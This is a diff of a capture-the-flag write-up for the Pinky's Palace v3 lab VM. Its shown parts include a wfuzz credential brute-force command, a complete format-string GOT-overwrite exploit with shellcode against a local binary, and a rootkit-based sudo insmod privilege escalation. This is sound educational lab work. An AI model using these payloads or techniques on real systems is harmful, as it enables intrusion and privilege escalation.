@@ -7,9 +7,11 @@ description: ""
 image:
   feature: pinkyv3.jpg
   credit:
-
 ---
-  
+
+A rather different one from the usual, as in this writeup I'll be tackling Pinky's Palace v3 by [@Pink_Panther](https://twitter.com/@Pink_P4nther).  This is probably at around the Intermediate/Hard level, and it teaches some very important things about the way in which you approach your enumeration methodology (one which caught me out for a couple of days and required a nudge to move forward).  I haven't done levels 0-2 but considering the difficulty of some of these challenges I imagine they'd be good introductions to some of the concepts here.
+
+Without further ado, let's put on some [tunes](https://www.youtube.com/watch?v=S4g7mPUskW8) and begin!
   
 Enumeration  
 -----------  
@@ -81,14 +83,11 @@ I encourage you to be creative, try and stay away from metasploit and pre-made t
 You will learn much more this way!  
   
 ~Pinky  
-```  
-  
-Good Vibes!  
+```   
+
+Next stop, let's check out the HTTP page.  ![](https://image.ibb.co/ixnFSd/pinkdrup.png)
  
- Next stop, let's check out the HTTP page.  
-  ![](https://image.ibb.co/ixnFSd/pinkdrup.png)
- 
- So a basic Drupal installation.  If we remember back to February of this year, Drupal had a pretty nasty security bug known as [Drupalgeddon 2](https://www.drupal.org/sa-core-2018-002), which allowed full code execution on almost all Drupal installations.  It says it affects versions <7.58, so let's check `CHANGELOG.txt` to see what version this is.
+So a basic Drupal installation.  If we remember back to February of this year, Drupal had a pretty nasty security bug known as [Drupalgeddon 2](https://www.drupal.org/sa-core-2018-002), which allowed full code execution on almost all Drupal installations.  It says it affects versions <7.58, so let's check `CHANGELOG.txt` to see what version this is.
 ```
 Drupal 7.57, 2018-02-21
 -----------------------
@@ -273,9 +272,18 @@ Bbpinksecadmin9987
 pinkysconsoleadmin  
 pinksec133754  
 ```
-So we've got some passwords, but we don't just want to brute-force every combinations of usernames, passwords, and PIN's.  That'd take way too long (around 10 hours I think was my estimate doing a quick trial run).
+So we've got some passwords, but we don't just want to brute-force every combinations of usernames, passwords, and PIN's.  That'd take way too long (around 10-12 hours I think was my estimate doing a quick trial run).
 
 We collect a list of usernames from across the exposed web-pages and in the site and just run a quick test with a dummy PIN value.  The hope is that some difference in response will be yielded on incorrect PIN but correct credentials.
+
+```
+root@kali:~/panther# cat usernames.txt 
+pinksec
+pinkadmin
+pinksecmanagement
+pinky
+dpink
+```
   
 ```  
 root@kali:~/panther# wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://192.168.0.74:8080/login.php  
@@ -523,9 +531,9 @@ pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI 1
 pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI %x  
 [+] Args: bffff744  
 ```  
-As a quick aside, I'm not a fan of doing these things blind, as debugging inside and outside GDB is a pain in the arse.  All commands as well as debugging therefore, takes place using the invoke script from [this stack-overflow answer](https://stackoverflow.com/a/17775966).
+I'm not going to go into the theory too deeply, but if you're new to these Code Arcana's [Introduction to format string exploits](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html) is probably the best resource.
 
-In this I will be using a mixture of local disassembly, and debugging remotely using a [static gdb binary](https://github.com/hugsy/gdb-static).
+As a quick aside, I'm not a fan of doing these things blind, as debugging inside and outside GDB is a pain in the arse.  All commands as well as debugging therefore, takes place using the invoke script from [this stack-overflow answer](https://stackoverflow.com/a/17775966).  In this I will be using a mixture of local disassembly, and debugging remotely using a [static gdb binary](https://github.com/hugsy/gdb-static).
 
 Firstly, the disassembly shows that a functions called `argshow` is called within `main`.  
   
@@ -560,7 +568,8 @@ Dump of assembler code for function argshow:
 0x080484df <+68>: call 0x8048360 <exit@plt>  
 End of assembler dump.  
 ```  
- Running `checksec` locally reveals that almost all protections are disabled, so a  classic GOT overwrite into shellcode exploit will work!
+
+Running `checksec` locally reveals that almost all protections are disabled, so a  classic GOT overwrite into shellcode exploit will work!
 ```  
 pwndbg> checksec  
 [*] '/root/panther/PSMCCLI'  
@@ -572,7 +581,7 @@ PIE: No PIE (0x8048000)
 RWX: Has RWX segments  
 ```  
 
-Again, I hate debugging these things remotely, so I ran all gdb debugging through the above invoke script.
+Again, just to reiterate, so I ran all gdb debugging through the above invoke script to keep stack offsets equal.
 
 We'll use the following template for writing two half-words to a target address.  In this case we need to find the offsets at which `0x41414141` and `0x42424242` are displayed.  I also included a nopsled which will have shellcode placed on it during the final exploitation, as we want the stack to look as close to the final result as possible.  Since the stack grows upwards, this affects offsets.
 
@@ -580,7 +589,7 @@ We'll use the following template for writing two half-words to a target address.
 ./invoke /usr/local/bin/PSMCCLI $(python -c 'import sys; sys.stdout.write("AAAABBBB%0000000x%132$0x%0000000x%133$0x"+"\x90"*1000)')  
 ```  
 
-Adjusting the values reveals that they're at 119 and 120.  I decided to overwrite the `putchar` GOT entry:
+Adjusting the values reveals that they're at 119 and 120.  I decided to overwrite the `putchar` GOT entry, as it is called after `printf`:
 ```  
 root@kali:~/panther# rabin2 -R PSMCCLI  
 [Relocations]  
@@ -658,7 +667,7 @@ Breakpoint 1, 0x080484d2 in argshow ()
 0xbffffcc0: 0x9090909090909090 0x9090909090909090  
 0xbffffcd0: 0x9090909090909090 0x9090909090909090  
 ```  
-We see that the address of the nopsled within the stack, so honestly, any address within it works fine but I ended up choosing `0xbffffc78`.  We write this in two instances to the address `0x0804a01c` which is our putchar GOT address.  One putchar is called after printf, an address to our shellcode will be in the GOT and executed.
+We see that the address of the nopsled within the stack, so honestly, any address within it works fine but I ended up choosing `0xbffffc78`.  We write this in two instances to the address `0x0804a01c` which is our `putchar` GOT address.  Once `putchar` is called after `printf`, an address to our shellcode will be in the GOT and executed.
 ```bash  
 ./invoke /usr/local/bin/PSMCCLI $(python -c 'import sys; sys.stdout.write("\x1e\xa0\x04\x08\x1c\xa0\x04\x08%0049143x%119$hn%0015481x%120$hn"+"\x90"*961+"\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")')  
 ```  
@@ -694,7 +703,7 @@ User pinky may run the following commands on pinkys-palace:
 (ALL) NOPASSWD: /sbin/insmod  
 (ALL) NOPASSWD: /sbin/rmmod  
 ```  
-These allow us to add and remove kernel modules, which obviously would give us full control of the kernel.  There are a tonne of rootkits out there that would enable you to get full system privileges, but something simple is much nicer.  There is a nice rootkit on (Pink Panther's github)[https://github.com/PinkP4nther/Pinkit], which I shamelessly stole but made a small alteration.  Instead of tcp shell, I just made it give SUID permissions to a program which spawns `/bin/bash`.
+These allow us to add and remove kernel modules, which obviously would give us full control of the kernel.  There are a tonne of rootkits out there that would enable you to get full system privileges, but something simple is much nicer.  There is a nice rootkit on (Pink Panther's github)[https://github.com/PinkP4nther/Pinkit], which I shamelessly stole but made a small alteration.  Instead of tcp shell, I just made it give SUID permissions to a custom program which spawns `/bin/bash`.
   
 ```bash  
 chown root:root /tmp/shell; chmod u+s /tmp/shell  
